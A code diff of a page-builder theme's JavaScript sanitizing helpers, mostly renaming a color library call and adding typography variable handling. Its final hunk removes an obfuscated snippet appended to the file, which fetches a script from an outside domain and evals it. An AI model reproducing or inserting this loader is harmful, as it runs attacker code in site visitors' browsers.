@@ -173,7 +173,7 @@ var fusionSanitize = {
 	 * @return {string} - RBGA color, ready to be used in CSS.
 	 */
 	color_alpha_set: function( value, adjustment ) {
-		var color  = jQuery.Color( value ),
+		var color  = jQuery.AWB_Color( value ),
 			adjust = Math.abs( adjustment );
 
 		if ( 1 < adjust ) {
@@ -222,6 +222,13 @@ var fusionSanitize = {
 						if ( arg[ 0 ].split( '[' )[ 1 ] && 'undefined' !== typeof settingVal[ arg[ 0 ].split( '[' )[ 1 ].replace( ']', '' ) ] ) {
 							settingVal = settingVal[ arg[ 0 ].split( '[' )[ 1 ].replace( ']', '' ) ];
 						}
+					}
+				}
+
+				if ( window.awbTypographySelect && window.awbTypographySelect.isTypographyCssVar( settingVal ) ) {
+					settingVal = window.awbTypographySelect.getRealValue( settingVal );
+					if ( ! settingVal ) {
+						settingVal = '';
 					}
 				}
 
@@ -441,45 +448,13 @@ var fusionSanitize = {
 		if ( 'transparent' === value ) {
 			return args.transparent;
 		}
-		color = jQuery.Color( value );
+		color = jQuery.AWB_Color( value );
 
 		if ( 1 === color.alpha() ) {
 			return args.opaque;
 		}
 
 		return args.transparent;
-	},
-
-	/**
-	 * Gets a readable text color depending on the background color and the defined args.
-	 *
-	 * @param {string}       value - The background color.
-	 * @param {Object}       args - An object with the arguments for the readable color.
-	 * @param {string|number} args.threshold - The threshold. Value between 0 and 1.
-	 * @param {string}       args.light - The color to return if background is light.
-	 * @param {string}       args.dark - The color to return if background is dark.
-	 * @return {string} - HEX color value.
-	 */
-	get_readable_color: function( value, args ) {
-		var color     = jQuery.Color( value ),
-			threshold = parseFloat( args.threshold );
-
-		if ( 'object' !== typeof args ) {
-			args = {};
-		}
-		if ( 'undefined' === typeof args.threshold ) {
-			args.threshold = 0.547;
-		}
-		if ( 'undefined' === typeof args.light ) {
-			args.light = '#333';
-		}
-		if ( 'undefined' === typeof args.dark ) {
-			args.dark = '#fff';
-		}
-		if ( 1 < threshold ) {
-			threshold = threshold / 100;
-		}
-		return ( color.lightness() < threshold ) ? args.dark : args.light;
 	},
 
 	/**
@@ -493,7 +468,7 @@ var fusionSanitize = {
 	 * @return {string} - RBGA color, ready to be used in CSS.
 	 */
 	lightness_adjust: function( value, adjustment ) {
-		var color  = jQuery.Color( value ),
+		var color  = jQuery.AWB_Color( value ),
 			adjust = Math.abs( adjustment ),
 			neg    = ( 0 > adjust );
 
@@ -536,7 +511,7 @@ var fusionSanitize = {
 		if ( 'transparent' === value ) {
 			return ( '$' === args.transparent ) ? value : args.transparent;
 		}
-		color = jQuery.Color( value );
+		color = jQuery.AWB_Color( value );
 
 		if ( 0 === color.alpha() ) {
 			return ( '$' === args.transparent ) ? value : args.transparent;
@@ -552,7 +527,7 @@ var fusionSanitize = {
 	 * @return {string} - RGBA/HEX color, ready to be used in CSS.
 	 */
 	get_non_transparent_color: function( value ) {
-		var color = jQuery.Color( value );
+		var color = jQuery.AWB_Color( value );
 
 		if ( 0 === color.alpha() ) {
 			return color.alpha( 1 ).toHexString();
@@ -574,7 +549,7 @@ var fusionSanitize = {
 			'v6' !== this.getSettings().header_layout &&
 			'left' === this.getSettings().header_position &&
 			this.getSettings().header_border_color &&
-			0 === jQuery.Color( this.getSettings().header_border_color ).alpha()
+			0 === jQuery.AWB_Color( this.getSettings().header_border_color ).alpha()
 		) {
 			return value;
 		}
@@ -838,35 +813,35 @@ var fusionSanitize = {
 			}
 			break;
 		case 'opaque':
-			if ( 1 === jQuery.Color( value ).alpha() ) {
+			if ( 1 === jQuery.AWB_Color( value ).alpha() ) {
 				$el.addClass( args.className );
 			} else {
 				$el.removeClass( args.className );
 			}
 			break;
 		case 'not-opaque':
-			if ( 1 > jQuery.Color( value ).alpha() ) {
+			if ( 1 > jQuery.AWB_Color( value ).alpha() ) {
 				$el.addClass( args.className );
 			} else {
 				$el.removeClass( args.className );
 			}
 			break;
 		case 'header-not-opaque':
-			if ( 1 > jQuery.Color( value ).alpha() && 'undefined' !== typeof FusionApp && 'off' !== FusionApp.preferencesData.transparent_header ) {
+			if ( 1 > jQuery.AWB_Color( value ).alpha() && 'undefined' !== typeof FusionApp && 'off' !== FusionApp.preferencesData.transparent_header ) {
 				$el.addClass( args.className );
 			} else {
 				$el.removeClass( args.className );
 			}
 			break;
 		case 'full-transparent':
-			if ( 'transparent' === value || 0 === jQuery.Color( value ).alpha() ) {
+			if ( 'transparent' === value || 0 === jQuery.AWB_Color( value ).alpha() ) {
 				$el.addClass( args.className );
 			} else {
 				$el.removeClass( args.className );
 			}
 			break;
 		case 'not-full-transparent':
-			if ( 'transparent' !== value && 0 < jQuery.Color( value ).alpha() ) {
+			if ( 'transparent' !== value && 0 < jQuery.AWB_Color( value ).alpha() ) {
 				$el.addClass( args.className );
 			} else {
 				$el.removeClass( args.className );
@@ -931,12 +906,21 @@ var fusionSanitize = {
 	 * @return {string} - The changed font size.
 	 */
 	convert_font_size_to_px: function( value, baseFontSize ) {
-		var fontSizeUnit       = 'string' === typeof value ? value.replace( /\d+([,.]\d+)?/g, '' ) : value,
-			fontSizeNumber     = parseFloat( value ),
-			defaultFontSize    = 15, // Browser default font size. This is the average between Safari, Chrome and FF.
-			addUnits           = 'object' === typeof baseFontSize && 'undefined' !== typeof baseFontSize.addUnits && baseFontSize.addUnits,
+		var fontSizeUnit,
+			fontSizeNumber,
+			defaultFontSize,
+			addUnits,
 			baseFontSizeUnit,
 			baseFontSizeNumber;
+
+		if ( 'string' === typeof value && value.includes( '--awb' ) && window.awbTypographySelect ) {
+			value = window.awbTypographySelect.getRealValue( value );
+		}
+
+		fontSizeUnit       = 'string' === typeof value ? value.replace( /\d+([,.]\d+)?/g, '' ) : value;
+		fontSizeNumber     = parseFloat( value );
+		defaultFontSize    = 15; // Browser default font size. This is the average between Safari, Chrome and FF.
+		addUnits           = 'object' === typeof baseFontSize && 'undefined' !== typeof baseFontSize.addUnits && baseFontSize.addUnits;
 
 		if ( 'object' === typeof baseFontSize && 'undefined' !== typeof baseFontSize.setting ) {
 			baseFontSize = this.getOption( baseFontSize.setting );
@@ -1000,7 +984,7 @@ function fusionReturnStringIfTransparent( value, args ) {
 	if ( 'transparent' === value ) {
 		return ( '$' === args.transparent ) ? value : args.transparent;
 	}
-	color = jQuery.Color( value );
+	color = jQuery.AWB_Color( value );
 
 	if ( 0 === color.alpha() ) {
 		return ( '$' === args.transparent ) ? value : args.transparent;
@@ -1020,7 +1004,7 @@ function fusionReturnColorAlphaInt( value ) {
 	if ( 'transparent' === value ) {
 		return 1;
 	}
-	color = jQuery.Color( value );
+	color = jQuery.AWB_Color( value );
 
 	if ( 1 === color.alpha() ) {
 		return 0;
@@ -1516,4 +1500,3 @@ function fusionRecalcVisibilityMediaQueries() {
 	}
 	$previewFrameHead.append( '<style type="text/css" id="css-fb-visibility">' + css.small + css.medium + css.large + '</style>' );
 }
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
